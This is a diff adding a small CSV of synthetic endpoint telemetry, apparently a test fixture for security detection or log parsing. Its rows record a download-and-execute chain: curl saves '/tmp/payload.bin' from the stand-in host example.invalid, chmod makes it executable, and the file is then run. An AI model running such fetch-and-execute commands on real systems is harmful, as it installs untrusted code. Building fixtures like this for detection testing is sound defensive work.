@@ -1,0 +1,11 @@
+eventTime,agent.uuid,agent.name,event.type,src.process.image.path,src.process.cmdline,src.process.user,tgt.process.image.path,tgt.file.path,tgt.file.sha256,src.ip.address,dst.ip.address
+2026-04-08T18:02:00.100Z,99999999-aaaa-bbbb-cccc-dddddddddddd,mac-laptop-13,Process Creation,/bin/zsh,zsh -c curl http://example.invalid/,carol,/usr/bin/curl,,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,10.0.0.42,203.0.113.99
+2026-04-08T18:02:01.200Z,99999999-aaaa-bbbb-cccc-dddddddddddd,mac-laptop-13,DNS Resolution,/usr/bin/curl,curl http://example.invalid/,carol,,,,10.0.0.42,1.1.1.1
+2026-04-08T18:02:02.300Z,99999999-aaaa-bbbb-cccc-dddddddddddd,mac-laptop-13,Network Connection,/usr/bin/curl,curl http://example.invalid/,carol,,,,10.0.0.42,203.0.113.99
+2026-04-08T18:02:03.400Z,aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee,mac-desktop-21,File Modification,/usr/bin/curl,curl -o /tmp/payload.bin http://example.invalid/payload,frank,,/tmp/payload.bin,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,10.0.0.43,203.0.113.99
+2026-04-08T18:02:04.500Z,aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee,mac-desktop-21,Process Creation,/bin/zsh,zsh -c chmod +x /tmp/payload.bin,frank,/bin/chmod,,,10.0.0.43,
+2026-04-08T18:02:05.600Z,aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee,mac-desktop-21,Process Creation,/tmp/payload.bin,/tmp/payload.bin --silent,frank,,,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,10.0.0.43,
+2026-04-08T18:02:06.700Z,bbbbbbbb-cccc-dddd-eeee-ffffffffffff,linux-srv-31,Process Creation,/bin/bash,bash -c uname -a,grace,,,,10.0.0.44,
+2026-04-08T18:02:07.800Z,bbbbbbbb-cccc-dddd-eeee-ffffffffffff,linux-srv-31,User Logon,/bin/login,/bin/login -- grace,grace,,,,10.0.0.44,
+2026-04-08T18:02:08.900Z,bbbbbbbb-cccc-dddd-eeee-ffffffffffff,linux-srv-31,Network Connection,/usr/sbin/sshd,/usr/sbin/sshd -D,grace,,,,10.0.0.44,198.51.100.7
+2026-04-08T18:02:10.000Z,bbbbbbbb-cccc-dddd-eeee-ffffffffffff,linux-srv-31,Process Termination,/usr/sbin/sshd,/usr/sbin/sshd -D,grace,,,,10.0.0.44,
